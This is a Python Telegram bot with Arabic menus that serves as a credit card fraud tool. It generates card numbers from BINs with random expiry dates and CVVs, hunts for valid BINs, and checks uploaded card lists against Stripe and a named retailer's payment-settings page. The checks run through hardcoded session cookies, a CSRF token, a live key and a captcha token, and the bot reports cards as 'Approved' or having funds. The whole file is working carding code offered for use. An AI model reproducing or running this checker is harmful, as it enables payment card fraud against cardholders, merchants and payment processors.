import random, os, telebot, requests, threading
from telebot import types
from user_agent import generate_user_agent

token = "7485773633:-kkM1tj6F5Bs"#token
SOLO = telebot.TeleBot(token)


uploaded_file_path = None
fishing_status = {}

##########################################
##########################################
def generate_random_visas(amount):
    visas = []
    gh = '123456789'
    sc = ['51', '52', '41', '50', '40', '53', '54', '55', '56', '57', '58', '59', '42', '43', '44', '45', '46', '47', '48', '49']
    with open('visafile.txt', 'w') as file:
        for _ in range(amount):
            z = "".join(random.choice(gh) for _ in range(4))
            zh = random.choice(sc) + z
            bin = zh
            len_card = 10
            month = ['01', '02', '03', '04', '05', '06', '07', '08', '10', '11', '12']
            year = ['2025', '2026', '2027', '2028', '2029', '2030', '2031', '2032']
            num = '0987654321'
            mm = random.choice(month)
            yy = random.choice(year)
            cvv = ''.join(random.choice(num) for _ in range(3))
            visa = bin + ''.join(random.choice(num) for _ in range(len_card)) + '|' + mm + '|' + yy + '|' + cvv
            visas.append(visa)
            file.write(visa + '\n')
    return visas

def generate_specific_visas(bin, amount):
    visas = []
    len_card = 10
    month = ['01', '02', '03', '04', '05', '06', '07', '08', '10', '11', '12']
    year = ['2025', '2026', '2027', '2028', '2029', '2030', '2031', '2032']
    num = '0987654321'
    with open('visafile.txt', 'w') as file: 
        for _ in range(amount):
            mm = random.choice(month)
            yy = random.choice(year)
            cvv = ''.join(random.choice(num) for _ in range(3))
            visa = bin + ''.join(random.choice(num) for _ in range(len_card)) + '|' + mm + '|' + yy + '|' + cvv
            visas.append(visa)
            file.write(visa + '\n')
    return visas
##########################################
##########################################
def Tele(ccx):
	import time,requests
	ccx=ccx.strip()
	c = ccx.split("|")[0]
	mm= ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]

	time.sleep(3)
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'billing_details[address][city]=new+york&billing_details[address][country]=US&billing_details[address][line1]=new+york+45&billing_details[address][line2]=&billing_details[address][postal_code]=10080&billing_details[address][state]=NY&billing_details[name]=yasirtraoig+yag&type=card&card[number]={c}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2Fd2c4996313%3B+stripe-js-v3%2Fd2c4996313%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fmorningsave.com&time_on_page=32090&client_attribution_metadata[client_session_id]=1a0d0550-adbc-4d37-9dff-cd4da7c64466&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=08314ef3-ed0a-41e4-94e3-7553010cc7397e0535&muid=aa12c9ab-d58e-422a-b625-e4547f117d2461b0dd&sid=b48bf2a4-eddd-44fb-9f52-9763a87a1f635a5dfb&key=pk_live_q6LDEL2Kt46unBXu6pqGs6X1&_stripe_version=2023-10-16&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQZtZzswHRjYzQguTCY5BDuN4ZRLeA77gJoEBkTFU0q953PiJoX23Yq_xGsvd4w_K7hDUNuLTfPtWcpO7wPP5k7A85h8Q5138klzZIZ72Z90X1hFfPOGlRK9CxLIGfivr-945sJI6X9cjXkAJGH8YAIiuwSzAGiJfKMrv4ZUXke54Web9O2nthUBbS31K4gLu7gtgRP4fQzUxUaGxAjav5suGS5Ml8i7AHP0k24t7CvMOkH4jyU-YdEg_V8lRRk7nnwN7CifoE-N9qM6qsFrb13nF8JH3DhcRUYXQLgcoTc67CCdpal2eA8mgcnHBtfkVRdbrUk_VlvGl7QsMHqwjRyMG9u2ikmfo0eNdrGxNeOoN-sPI4IPce4ficsZUTIDMNEiTepRz2cQ6FzDZ8mOqzZDPC4vBAodK_fzt3KUjdRUyq_0YBEr9J0bLQSAPMV2iP82jk388AxMVJazNaXPLa9_OG9Q4snNN8IGeUL5-VyGRlpnDZGV7wkYbxP1BCGPGcB2ITZqSsgdhjPCGRcxULV5s0rGHWjd6zqBc5I_hRAwDNZhYqTl0LMPnxyuOTrF7aJXQywuqowBQd0mqZ-3vKtiTMXBdNHGEA2LXZIgwmZehZWOUMh5Oz_oELpMZv96aJ9IO-GWd5XralBgDSBpO8nN_W7oTgLoSGm9Vy-Fvti-pI7JLKQJtw4e0CbqoK7hLKci-e6-hiC8pvoKr1_ozzzkaTvS6T4chjPDqMM1eSmj_wPF_gwjUjGtOyh95kfjQkhqQ1jkeCJ-KTsS9Uf9iAmvos8-RDpnIWozCnwC3GI11RlLDqgC6saMOLZQ5fMV2-eG4RN-21nnLni1t5Ga2syS67u-0AwrjPGsaT7X3krrR5vfKqm85-WS9rwamjhxMcVwZlwvwTz_CFSOAWaso6eXcbIv_Dl0Bvr9blUpkkwoQgzdESsHQ1bxMvBfJxVsYWq7ydzECrj2Dk0216sPMphb1t9vxcERKCKaF2UywcCnmb8DT8xX8BIq13Y5gvhHYa9_qepKSTrZ8euuF77ig68HZFBn75z-Dp2BIr2OWomF_CTzjEsF5nbUiyYajn0USXj5YWbCqlNh4pTNExvj-2U7exVbrQZNiRJsH-GUlav4h4_IvEzI_IP-J0_niyQVAo4NKL-sAlX8Dl6lyz_1VfHfAiV9e3LwNHKub1HphK7MkWb2bWMgRfC5IbVjAJBSCQ7MkFyBcc4TU3rMHXJehUlvPsyYN_vMItaxeh8oQMEETU3m-Ointzd9yTEyypRwqeiEFf76atk4EOjmr_St6VUDj1hPdtMb4JD2hSti3bh9z_uE4qvU1M_UIJ_iw7HgxhTT3bzm05-cL_CfYn7rQdPGvpL3AaUC7J3VVdqWCoiKjI61rRM9QFOVokqBNeYKYslKgiD3izAagl07oBnUdjpTawswGRnUrhZMbK_BiWkI0o58_KxM87RwpA7lkpHDr6Lt_Pt9rJ7oUDDOIwjC02l_2P5Am61X9TB6M4lYtS4DnYYO8jj3cfC3xPFm7tzoerFYTKpaV5SDtk9hXhtZchHQu_1--FhqoDRkNrFKoPjyLyh1L-gL4PNKdq-jeoVFXDAhy8lFkNIyuFOk4kDZO-s8Yvsv33ZqVD00KchcpKHvmdS3xqCrmvUJK7Ki2KxhwL5yz81FzPvkyBRG9NbqzZxasQ2Zqc5beVDo1Q1oCFA1iGJiI72MVdHZ80IJf3UHxo_PBxzGSq-EZG-8JQQjZF-HK76_wmhBY0vUqNysdHEwA5ll84BFDbofxilIm7HnJkSE2IWKQAN9-JSW0VQoX4109m0zceNsUele076BoShvefXDtJFDhdxFpASpnHQRV-hN_avFow6e0zTftQFEUOWDIiHA7Aodu-CHI5gPGSqVmKBnZJ_jC4bRJtbWLlxOArF-wg-kBYlcoIUEKXs1UaeK98ZbKOfmL6mV9W5szACsgm4ajfkPf0wGdmB_49FtHRu8O4HsIs3y_PPjsLkQPdGrXMIh0bHX8Sp5mOH8Q24V_0u_kkq_HG3tI0wtkXG2sE8Yly2vz_GBLFQ8p0TE7o40fUUYdKBn37bKBE26MLTNnaqxh6kD-LHs914X94JoGgGUnMRDoot6RUZVgR_PMsi8HdTaHffBoVStCPbhjGGy4e8i9JurguX24uNezFUK_v8PQuymecD29c0qVcT9fKNleHDOZjELJqhzaGFyZF9pZM4xrUyBomtypzRhYWI2YzeicGQA.WkpkO4yokLkbAkk3KBDjCJsT6MKpYm2W7I8uYX2nP-4'
	
	res = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data).json()
	if 'Your card number is incorrect.' in str(res):
		return 'Your card number is incorrect.'
	try:
		id = res['id']
		time.sleep(1)
	except:
		try:
			m=res['error']['code']['message']
			return m
		except:
			ms = res
			return ms
		
	cookies = {
	    '32ce5a69291eed4797ba85aa': '-1',
	    'session.morningsave.com': 's%3AbDY62MD_47zeQVcsBbGUHddD3Xcp5Jn8.N8j9lT0aQcBgkLbUdXqRTe%2Be2BwOineskCQR%2FNJWeoc',
	    '_ga': 'GA1.1.36238484.1714481829',
	    'FPID': 'FPID2.2.2dCYkbN50yUysvdKpXCJUjCrYu%2BdP58DFRyIJMMrhxU%3D.1714481829',
	    'FPLC': 'CRWFmgLS03P%2B3TalcTCwu86aY4XEjR5LGT6xIcCuX0cOgxRkoXrygDVzkJwPLHhs%2FGmkfBhctV08y2pLstan1gED1SaL%2FeLT7%2F4xx%2Fmpi0x7DZ%2FnyG4Edr%2FYmA97SQ%3D%3D',
	    '__stripe_mid': 'aa12c9ab-d58e-422a-b625-e4547f117d2461b0dd',
	    '__stripe_sid': 'b48bf2a4-eddd-44fb-9f52-9763a87a1f635a5dfb',
	    '_ga_WJZ87CP97G': 'GS1.1.1714488083.2.1.1714488712.60.0.0',
	}
	
	headers = {
	    'Accept': '*/*',
	    'Accept-Language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'Cookie': '32ce5a69291eed4797ba85aa=-1; session.morningsave.com=s%3AbDY62MD_47zeQVcsBbGUHddD3Xcp5Jn8.N8j9lT0aQcBgkLbUdXqRTe%2Be2BwOineskCQR%2FNJWeoc; _ga=GA1.1.36238484.1714481829; FPID=FPID2.2.2dCYkbN50yUysvdKpXCJUjCrYu%2BdP58DFRyIJMMrhxU%3D.1714481829; FPLC=CRWFmgLS03P%2B3TalcTCwu86aY4XEjR5LGT6xIcCuX0cOgxRkoXrygDVzkJwPLHhs%2FGmkfBhctV08y2pLstan1gED1SaL%2FeLT7%2F4xx%2Fmpi0x7DZ%2FnyG4Edr%2FYmA97SQ%3D%3D; __stripe_mid=aa12c9ab-d58e-422a-b625-e4547f117d2461b0dd; __stripe_sid=b48bf2a4-eddd-44fb-9f52-9763a87a1f635a5dfb; _ga_WJZ87CP97G=GS1.1.1714488083.2.1.1714488712.60.0.0',
	    'Origin': 'https://morningsave.com',
	    'Referer': 'https://morningsave.com/account/payment-settings',
	    'Sec-Fetch-Dest': 'empty',
	    'Sec-Fetch-Mode': 'cors',
	    'Sec-Fetch-Site': 'same-origin',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'X-Requested-With': 'XMLHttpRequest',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	data = {
	    'shipping-name': 'yasirtraoig yag',
	    'shipping-line1': 'new york 45',
	    'shipping-line2': '',
	    'shipping-zip': '10080',
	    'shipping-city': 'new york',
	    'shipping-state': 'NY',
	    'billing-country': 'US',
	    'billing-name': '',
	    'billing-line1': '',
	    'billing-line2': '',
	    'billing-zip': '',
	    'billing-city': '',
	    'billing-state': '',
	    '_csrf': 'F0cLEAXP--52gRSi9TswfaIK33TeBrT7O3mw',
	    'payment-method-id': id,
	    'paymentSettingId': '',
	}
	
	response = requests.post('https://morningsave.com/account/payment-settings', cookies=cookies, headers=headers, data=data)
	try:
	#ccx = '4701340005404292|10|2025|904'
		msg = (response.text)
	#print(msg)
		if 'The card was declined.' in msg or 'The card number is incorrect.' in msg:
			ms = ('Your card was declined.')
			return  ms
			#msgs = response.text['message']
			#print(f'{ccx}|{msg}')
		elif "The card's security code is incorrect." in msg:
			ms =("The card's security code is incorrect.")
			return ms
		else:
		#msgs = response.text['message']
			ms = ('Insufficient Funds')
			return ms
	except:
		msgs = response.text['message']
		return msgs
        
def dato(zh):

	try:
		api_url = get("https://bins.antipublic.cc/bins/"+zh).json()
		brand=api_url["brand"]
		card_type=api_url["type"]
		level=api_url["level"]
		bank=api_url["bank"]
		country_name=api_url["country_name"]
		country_flag=api_url["country_flag"]
		mn = f'''
Bin -> {zh}
Bin Info -> {card_type} - {brand} - {level}
Bank -> {bank}
Counrty -> {country_name} - {country_flag} '''
		return mn
	except:
		return 'No info'
##########################################
##########################################
@SOLO.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton("✨سحب كومبو cc✨", callback_data="takeanfile")
    button2 = types.InlineKeyboardButton("✨صيد بينات (BIN)✨", callback_data="binsfishing")
    button3 = types.InlineKeyboardButton("✨فحص كومبو cc✨", callback_data="uploadanfile")
    developerj = types.InlineKeyboardButton('✨ Dev ✨', url='https://t.me/l_7dz')
    channelj = types.InlineKeyboardButton('𝒎𝒚 𝒑𝒉𝒑 𝒃𝒐𝒕', url='https://t.me/l_7dz_bot')
    markup.add(developerj, channelj)
    markup.add(button1)
    markup.add(button2)
    markup.add(button3)
    photo_url = f"https://t.me/{message.from_user.username}"
    namess = f"[{message.from_user.first_name}]({photo_url})"
    text = f"⚠️ اهلا بك عزيزي ✨{namess}✨ في البوت\nاختر أحد الخيارات للمتابعة"
    SOLO.send_photo(message.chat.id, photo_url, caption=text, parse_mode='Markdown', reply_markup=markup)


@SOLO.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    chat_id = call.message.chat.id 
    global uploaded_file_path
    if call.data == "takeanfile":
        markup = types.InlineKeyboardMarkup()
        button_done = types.InlineKeyboardButton("✨من بين خاص✨", callback_data="done")
        button_random = types.InlineKeyboardButton("✨من بين عشوائي✨", callback_data="random")
        markup.add(button_done)
        markup.add(button_random)
        SOLO.send_message(chat_id, "✨اختر أحد الخيارين للمتابعة✨", reply_markup=markup)
    elif call.data == "random":
        msg = SOLO.send_message(chat_id, "كم عدد الفيزات التي تريد توليدها؟")
        SOLO.register_next_step_handler(msg, process_random_visas)
    elif call.data == "done":
        msg = SOLO.send_message(chat_id, "أدخل البين الخاص بك:")
        SOLO.register_next_step_handler(msg, ask_for_bin_visa_count)
    elif call.data == "binsfishing":
        markup = types.InlineKeyboardMarkup()
        btn_start = types.InlineKeyboardButton('✨بدء الصيد✨', callback_data=f'start_fishing')
        btn_stop = types.InlineKeyboardButton('✨ايقاف الصيد✨', callback_data=f'stop_fishing')
        markup.add(btn_start)
        markup.add(btn_stop)
        SOLO.send_message(chat_id, "✨اختر أحد الخيارات للمتابعة✨", reply_markup=markup)
    elif call.data == 'start_fishing':
        SOLO.send_message(chat_id, "تم بدء صيد البينات.✅")
        fishing_status[chat_id] = True
        threading.Thread(target=start_fishing, args=(chat_id,)).start()
    elif call.data == 'stop_fishing':
        SOLO.send_message(chat_id, "تم إيقاف صيد البينات.❌")
        fishing_status[chat_id] = False
    elif call.data == "uploadanfile":
        SOLO.send_message(chat_id, "الرجاء رفع الملف.‼️")
        SOLO.register_next_step_handler(call.message, handle_file_upload)
    elif call.data == "check_file" and uploaded_file_path:
        SOLO.send_message(chat_id, "🕠يتم الآن فحص الملف...")
        chk(call.message)
    elif call.data == "cancel":
        SOLO.send_message(chat_id, "تم الإلغاء❌.")


def process_random_visas(message):
    try:
        visa_count = int(message.text)
        generate_random_visas(visa_count)
        send_visa_file(message.chat.id) 
    except ValueError:
        SOLO.send_message(message.chat.id, "الرجاء إدخال عدد صحيح.")


def ask_for_bin_visa_count(message):
    user_bin = message.text
    msg = SOLO.send_message(message.chat.id, "كم عدد الفيزات التي تريد توليدها باستخدام البين الخاص؟")
    SOLO.register_next_step_handler(msg, lambda m: process_specific_visas(m, user_bin))


def process_specific_visas(message, user_bin):
    try:
        visa_count = int(message.text)
        generate_specific_visas(user_bin, visa_count)  
        send_visa_file(message.chat.id)  
    except ValueError:
        SOLO.send_message(message.chat.id, "الرجاء إدخال عدد صحيح.")


def send_visa_file(chat_id):
    with open('visafile.txt', 'rb') as file:
        SOLO.send_document(chat_id, file)


def handle_file_upload(message):
    if message.document:
        try:
            file_info = SOLO.get_file(message.document.file_id)
            downloaded_file = SOLO.download_file(file_info.file_path)
            with open("uploaded_file.txt", 'wb') as new_file:
                new_file.write(downloaded_file)
            global uploaded_file_path
            uploaded_file_path = "uploaded_file.txt"
            markup = types.InlineKeyboardMarkup()
            btn_check = types.InlineKeyboardButton(text="✨Stripe Auth✨", callback_data="check_file")
            btn_cancel = types.InlineKeyboardButton(text="✨الغاء✨", callback_data="cancel")
            markup.add(btn_check)
            markup.add(btn_cancel)
            SOLO.send_message(message.chat.id, "✅تم رفع الملف بنجاح✅ اختر البرابه التي سيتم عليها الفحص", reply_markup=markup)
        except Exception as e:
            SOLO.send_message(message.chat.id, f"حدث خطأ أثناء تحميل الملف: {str(e)}")
    else:
        SOLO.send_message(message.chat.id, "الرجاء رفع ملف صحيح.")

##########################################
##########################################
def start_fishing(chat_id):
    good_bins, bad_bins = 0, 0
    while fishing_status.get(chat_id, False): 
        try:
            bin_code = generate_bin_code()
            if check_bin(bin_code):
                good_bins += 1
                data = fetch_bin_data(bin_code)
                if data:
                    SOLO.send_message(chat_id, data)
            else:
                bad_bins += 1
        except Exception as e:
            SOLO.send_message(chat_id, f"حدث خطأ: {str(e)}")
            break 


def generate_bin_code():
    gh = '123456789'
    sc = ['51', '41', '50', '40']
    z = "".join(random.choice(gh) for i in range(4))
    return random.choice(sc) + z


def check_bin(bin_code):
    api_url = f"https://bins.antipublic.cc/bins/{bin_code}"
    response = requests.get(api_url)
    return response.status_code == 200


def fetch_bin_data(bin_code):
    api_url = f"https://bins.antipublic.cc/bins/{bin_code}"
    response = requests.get(api_url).json()

    brand = response["brand"]
    card_type = response["type"]
    level = response["level"]
    bank = response["bank"]
    country_name = response["country_name"]
    country_flag = response["country_flag"]

    return f"""
    ϟ 𝓝𝓔𝓦 𝓑𝓘𝓝 𝓢𝓞𝓛𝓞 ϟ
    ~•~•~•~•~•~•~•~•~•
    ϟ 𝓑𝓘𝓝 -> {bin_code}
    ϟ 𝓒𝓞𝓤𝓝𝓣𝓡𝓨 -> {country_name} {country_flag}
    ϟ 𝓝𝓔𝓣𝓦𝓞𝓡𝓚 -> {level}
    ϟ 𝓑𝓡𝓐𝓝𝓓 -> {brand}
    ϟ 𝓣𝓨𝓟𝓔 -> {card_type}
    ϟ 𝓑𝓐𝓝𝓚 𝓝𝓐𝓜𝓔 -> {bank}
    ~•~•~•~•~•~•~•~•~•
    ϟ DEV🔥-> @l_7dz
   ϟ Bot : @Visa_Power_dz_bot 
    """
##########################################
##########################################
def chk(message):
    dd = 0
    live = 0
    ch = 0
    cv = 0
    with open(uploaded_file_path, 'r') as file:
        lino = file.readlines()
        total = len(lino)
        for cc in lino:
            bo = cc[:6]
            inv = str(dato(bo)) 
            last = str(Tele(cc))  
            msg = f'''
✅Approved ✅ 
~•~•~•~•~•~•~•~•~•~•~•~
ϟCC -> {cc}
ϟGateway -> Stripe Auth
ϟResponse -> {last}
~•~•~•~•~•~•~•~•~•~•~•~
{inv}
~•~•~•~•~•~•~•~•~•~•~•~
ϟ DEV🔥-> @l_7dz
   ϟ Bot : @Visa_Power_dz_bot
'''

            if 'Funds' in last:
                live += 1
                SOLO.send_message(message.chat.id, msg)
            elif 'declined' in last or 'Your card number is incorrect.' in last:
                dd += 1
            elif 'security' in last:
                cv += 1
                SOLO.send_message(message.chat.id, msg)
            else:
                ch += 1
                SOLO.send_message(message.chat.id, msg)
##########################################
##########################################

SOLO.polling()